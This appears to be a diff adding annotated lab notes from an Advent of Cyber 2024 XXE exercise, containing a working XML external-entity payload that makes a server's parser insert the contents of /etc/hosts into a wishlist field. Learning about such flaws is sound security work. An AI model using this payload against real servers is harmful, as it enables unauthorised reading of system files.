@@ -1,0 +1,14 @@
+# XML file (from XXE in AoC24) that includes references for external entities
+
+# First two lines introduce an external entity called 'payload'
+<!--?xml version="1.0" ?-->
+# '<!ENTITY...>' tells the XML parser to replace the '&payload;' reference
+# with the contents of the '/etc/hosts/' file on the server (i.e. SYSTEM)
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
+# The lines above are what was added to the original XML file below
+<wishlist>
+  <user_id>1</user_id>
+     <item>
+       <product_id>&payload;</product_id>
+     </item>
+</wishlist>
